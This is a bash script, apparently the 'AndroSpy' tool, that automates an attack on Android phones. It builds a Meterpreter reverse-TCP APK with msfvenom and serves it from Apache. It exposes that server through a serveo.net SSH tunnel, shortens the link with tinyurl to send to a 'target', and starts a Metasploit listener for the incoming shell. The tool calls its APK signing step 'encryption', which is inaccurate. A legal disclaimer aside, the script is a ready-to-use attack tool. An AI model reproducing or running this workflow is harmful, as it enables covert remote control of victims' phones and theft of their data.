#!/bin/bash
# Coded By Belahsan Ouerghi (You dont become a coder by just changing the credits , Your R just a a Script Kiddie OwO)
# Tunisian Eagles Team
# Contact : TunisianEagles@protonmail.com 
# Program : www.github.com/TunisianEagles/androspy
# my Github : www.github.com/TunisianEagles
# If you wanna Modify The Script Contact me fb/ouerghi.belahsan
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
y="Y"
n="n"
e="ENTER"
#ROOT PRIVILEGIES
if [[ $EUID -ne 0 ]]; then
        echo -e "	$yellow[!]$white execute program as root $yellow[!]$nc"
        echo -e "	$green Type$white sudo ./androspy.sh $green :)$nc"
        exit 1
fi
function readme() {
clear
echo -e "$red		 ▄▄▄·  ▐ ▄ ·▄▄▄▄  ▄▄▄        .▄▄ ·  ▄▄▄· ▄· ▄▌"
echo "		▐█ ▀█ •█▌▐███▪ ██ ▀▄ █·▪     ▐█ ▀. ▐█ ▄█▐█▪██▌"
echo "		▄█▀▀█ ▐█▐▐▌▐█· ▐█▌▐▀▀▄  ▄█▀▄ ▄▀▀▀█▄ ██▀·▐█▌▐█▪"
echo "		▐█ ▪▐▌██▐█▌██. ██ ▐█•█▌▐█▌.▐▌▐█▄▪▐█▐█▪·• ▐█▀·."
echo -e "		 ▀  ▀ ▀▀ █▪▀▀▀▀▀• .▀  ▀ ▀█▄▀▪ ▀▀▀▀ .▀     ▀ • $nc"
echo -e "$cyan        ╔────────────────────────────────────────────────────────────────╗"
echo -e "$cyan        |$white$yellow  attacking targets without prior mutual consent is ILLEGAL.    $cyan|"
echo -e "$cyan        |$white$yellow  Developers are not responsible for any damage caused by this  $cyan|"
echo -e "$cyan        |$white$yellow  script.                                                       $cyan|"
echo -e "$cyan        |$white$red                        STAY LEGAL !!                           $cyan|"
echo -e "$cyan        |$white$green                    .:.:. Contact .:.:.                         $cyan|"                          
echo -e "$cyan        |$white$green  Github  $white:$blue 	www.github.com/TunisianEagles                    $cyan|"
echo -e "$cyan        |$white$green  Youtube $white:$blue 	https://goo.gl/9x61ys                 		 $cyan|"
echo -e "$cyan        |$white$green  Website $white:$blue    http://tunisianeagles.github.io/                 $cyan|"
echo -e "$cyan        |$white$green  Email   $white:$blue 	TunisianEagles@protonmail.com                    $cyan|"
echo -e "$cyan        ╘────────────────────────────────────────────────────────────────╝$nc\n"
echo -e  "$red[$green+$red]$white Press $red[$green$e$red]$white To Continue ...$nc"
read
}
function banner() {
clear
	echo -e "	\033[0;36m _______  _        ______   _______  _______ \033[1;31m _______  _______          
	\033[0;36m(  ___  )( (    /|(  __  \ (  ____ )(  ___  )\033[1;31m(  ____ \(  ____ )|\     /|
	\033[0;36m| (   ) ||  \  ( || (  \  )| (    )|| (   ) |\033[1;31m| (    \/| (    )|( \   / )
	\033[0;36m| (___) ||   \ | || |   ) || (____)|| |   | |\033[1;31m| (_____ | (____)| \ (_) / 
	\033[0;36m|  ___  || (\ \) || |   | ||     __)| |   | |\033[1;31m(_____  )|  _____)  \   /  
	\033[0;36m| (   ) || | \   || |   ) || (\ (   | |   | |\033[1;31m      ) || (         ) (   
	\033[0;36m| )   ( || )  \  || (__/  )| ) \ \__| (___) |\033[1;31m/\____) || )         | |   
	\033[0;36m|/     \||/    )_)(______/ |/   \__/(_______)\033[1;31m\_______)|/          \_/ "
	echo -e "\n		     \033[0;36mAuthor $white: \033[1;32m@Belahsan_Ouerghi$nc"
	echo -e "\n      		\e[44m$red[$green!$red]$white WARNING : Attacking Targets Without Prior  $red[$green!$red]$nc"
	echo -e "      		\e[101m$blue[$green!$blue]$white  Consent Is Illegal And Punished By Law.   $blue[$green!$blue]$nc\n"
}
function server() {
sudo service apache2 start
whiptail --title "Warning" --msgbox "                            Hello World !!" 8 78
whiptail --title "Warning" --msgbox "                            Don't Close XTERM " 8 78
	sleep 2
	xterm -T "IP Poisener" -e "ssh -R 80:localhost:80 `echo -n $(date) | md5sum | cut -c1-8`@serveo.net 2> /dev/null > link.log" &
	sleep 7
link=$(grep -o "https://[0-9a-z]*\.serveo.net" link.log)
	echo -e "  $red[$green*$red]$yellow Send the direct link to target : $link/$payload_name.apk$nc"
tinyurl=$(curl -s http://tinyurl.com/api-create.php?url=$link/$payload_name.apk | head -n1)
	echo -e "  $red[$green*$red]$yellow Send Link To Target using tinyurl : $tinyurl$nc\n"
	}
function payload() {
read -p "  $(echo -e $red[$green+$red]$white Enter LHOST : $nc)" lhost
	echo -e "  \033[1;31mLHOST$white =>$cyan $lhost$nc"
read -p "  $(echo -e $red[$green+$red]$white Enter LPORT : $nc)" lport
	echo -e "  \033[1;31mLPORT$white =>$cyan $lport$nc"
read -p "  $(echo -e $red[$green+$red]$white Enter Payload Name : $nc)" payload_name
	echo -e "  \033[1;31mPayload Name$white =>$cyan $payload_name$nc"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $payload_name.apk 2> /dev/null
	echo ""
	echo -e "$cyan			╔───────────────────────────────────────╗$nc"
	echo -e "$cyan			│$nc $red[$green+$red]$green Payload Successfuly Generated $red[$green+$red]$cyan │$nc"
	echo -e "$cyan			┖───────────────────────────────────────┙$nc\n"
sudo cp -r $payload_name.apk /var/www/html
	}
function size() {
	#Terminal Re-size
			resize -s 40 92 > /dev/null
	}
function cryp() {
#### About Cryot i will Create As another Options ...
read -p "  $(echo -e $red[$green+$red]$white Do you Wanna Encrypt The Payload $red[$cyan$payload_name.apk$red]$nc $red[$green$y$white/$green$n$red]$white : $nc )" crypt
if [[ $crypt = "Y" ]]; then
echo -e "\n  $red[$green+$red]$white Payload Encrypter $blue\n"
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $payload_name.apk alias_name
echo -e "\n  $red[$green+$red]$white Your Payload Has Been Successfully Encrypted $red[$green+$red]$nc\n"
elif [[ $crypt = "y" ]]; then
echo -e "\n  $red[$green+$red]$white Payload Encrypter $blue\n"
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $payload_name.apk alias_name
echo -e "\n  $red[$green+$red]$white Your Payload Has Been Successfully Encrypted $red[$green+$red]$nc\n"
elif [[ $crypt = "yes" ]]; then
echo -e "\n  $red[$green+$red]$white Payload Encrypter $blue\n"
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $payload_name.apk alias_name
echo -e "\n  $red[$green+$red]$white Your Payload Has Been Successfully Encrypted $red[$green+$red]$nc\n"
elif [[ $crypt = "YES" ]]; then
echo -e "\n  $red[$green+$red]$white Payload Encrypter $blue\n"
keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore $payload_name.apk alias_name
echo -e "\n  $red[$green+$red]$white Your Payload Has Been Successfully Encrypted $red[$green+$red]$nc\n"
else
sleep 1
echo -e "\n  $red[$yellow!$red]$white Payload Not Crypted $red[$yellow!$red]$nc\n"
fi	
				}
function listener() {
read -p "  $(echo -e $red[$green+$red]$white Do you wanna start a listener $red[$green$y$white/$green$n$red]$white : $nc)" listener
if [ $listener = "y" ]
then
	echo -e "\n  $red[$green+$red]$white Starting a listener ..$nc"
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
msfconsole -r listener.rc
elif [ $listener = "Y" ]
then
	echo -e "\n  $red[$green+$red]$white Starting a listener ..$nc"
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
msfconsole -r listener.rc
elif [ $listener = "yes" ]
then
	echo -e "\n  $red[$green+$red]$white Starting a listener ..$nc"
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
msfconsole -r listener.rc
elif [ $listener = "Yes" ]
then
	echo -e "\n  $red[$green+$red]$white Starting a listener ..$nc"
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
msfconsole -r listener.rc
else
	echo -e "\n  $red[$yellow!$red]$white Program Closed$nc\n"
fi
	}
size
readme
banner
payload
cryp
server
listener
